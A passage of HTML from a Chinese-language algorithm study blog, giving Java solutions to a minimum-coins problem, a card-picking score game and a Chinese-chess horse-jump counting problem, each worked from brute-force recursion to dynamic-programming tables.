punctuation">[</span>aim <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> rest <span class="token operator">&lt;=</span> aim<span class="token punctuation">;</span> rest<span class="token operator">++</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>index<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>index<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>rest<span class="token operator">&lt;</span>aim<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>rest<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">*</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> rest<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> p <span class="token operator">=</span> dp<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> k <span class="token operator">*</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">?</span> p <span class="token operator">+</span> k <span class="token operator">:</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">,</span> p <span class="token operator">+</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h5><p>然而我们其实不需要遍历k，因为我们可以看出想得到某个数据，该数是由a, b, c, d, … 决定出来的，而rest-arr[i]是由b, c, d, … 决定出来的，所以我们就可以通过a和rest-arr[i]直接决定该数，从而少了一层循环</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f12.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">CoinsMin3</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> aim<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> aim <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 设置最后一行的值，除了dp[N][0]为0之外，其他都是-1</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> rest <span class="token operator">&lt;=</span> aim<span class="token punctuation">;</span> rest<span class="token operator">++</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token class-name">N</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>  <span class="token comment">// 从下往上计算每一行</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> rest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> rest <span class="token operator">&lt;=</span> aim<span class="token punctuation">;</span> rest<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 每一行都从左往右</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 初始时先设置dp[i][rest]的值无效</span>            <span class="token comment">// 下面的值如果有效就先设置成下面的值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment">// 左边的位置不越界并且有效</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// 如果之前下面的值无效</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">// 说明下面和左边的值都有效，取最小值</span>                <span class="token keyword">else</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>rest <span class="token operator">-</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>aim<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x03-题目三"><a href="#0x03-题目三" class="headerlink" title="0x03 题目三"></a>0x03 题目三</h3><p>左神算法0x03中暴力递归下的分数最高问题</p><h4 id="1-0-暴力递归-2"><a href="#1-0-暴力递归-2" class="headerlink" title="1.0 暴力递归"></a>1.0 暴力递归</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">highestScore</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-严格表结构-2"><a href="#3-0-严格表结构-2" class="headerlink" title="3.0 严格表结构"></a>3.0 严格表结构</h4><blockquote><p>1）确定可变参数</p><p>2个可变参数，l和r</p><p>2）确定最终目标</p><p>f一张表，s一张表，都是求(0,3)位置的值，可以看到l一定不会大于r，所以表的左下部分废弃</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f13.png"></p><p>3）base case</p><p>f的base case <code>l == r</code> -&gt; <code>arr[l]</code></p><p>s的base case <code>l == r</code> -&gt; <code>0</code></p><p>4）搞清表中各个数的依赖关系</p><p>f和s互相依赖，比如求f(0,3)则需要s(0,3-1)和s(0+1,3)，函数s同理</p><p>5）确定依次计算的顺序</p><p>所以从对角线往右上角求即可</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">highestScore2</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> <span class="token class-name">N</span> <span class="token operator">=</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> col <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> row <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>col<span class="token operator">&lt;</span><span class="token class-name">N</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>row<span class="token operator">&lt;</span><span class="token class-name">N</span> <span class="token operator">&amp;&amp;</span> col <span class="token operator">&lt;</span> <span class="token class-name">N</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            f<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>row<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">+</span> s<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            s<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            col<span class="token operator">++</span><span class="token punctuation">;</span>            row<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        col<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token class-name">N</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-题目四"><a href="#0x04-题目四" class="headerlink" title="0x04 题目四"></a>0x04 题目四</h3><p>象棋中马的跳法，请想象一个象棋的棋盘，然后把整个棋盘放入第一象限，棋盘的最左下角是(0,0)位置。那么整个棋盘就是横坐标上9条线、纵坐标上10条线的一个区域</p><p>给你三个 参数，x，y，k，返回如果“马”从(0,0)位置出发，必须走k步，最后落在(x,y)上的方法数有多少种</p><h4 id="1-0-4"><a href="#1-0-4" class="headerlink" title="1.0"></a>1.0</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// 表示目的地为(x,y) 走k步</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span>  <span class="token number">0</span> <span class="token operator">||</span> x <span class="token operator">></span> <span class="token number">8</span> <span class="token operator">||</span> y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 表示目的地为(0,0) 走0步</span>    <span class="token comment">// 所以(x == 0 &amp;&amp; y == 0)表示目的地确实是(0,0)，代表是1次成功的方法，而目的地是其他点则不成功</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> y <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 目标为(x,y)，考虑周围哪个点走一步可以走到(x,y)，即周围成"日"的8个点</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token operator">+</span> <span class="token function">process</span><span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">HorseJump</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-0-1"><a href="#3-0-1" class="headerlink" title="3.0"></a>3.0</h4><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm4_f14.png"></p><p>三个可变参数，所以是三维数组，越界即长方体外部则为0</p><p>base case为k=0，第0层，只有(0,0)为1，其他点都为0</p><p>从下往上一层一层往上算，每层的点都由下层的8个点之和决定</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">HorseJump2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&lt;</span>  <span class="token number">0</span> <span class="token operator">||</span> x <span class="token operator">></span> <span class="token number">8</span> <span class="token operator">||</span> y <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> y <span class="token operator">></span> <span class="token number">9</span> <span class="token operator">||</span> k <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 只有(0,0)为1，其他点都为0</span>    <span class="token comment">// 从下往上一层一层往上算</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>h<span class="token operator">&lt;</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>h<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">getValue</span><span class="token punctuation">(</span>dp<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span> h<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>h<span 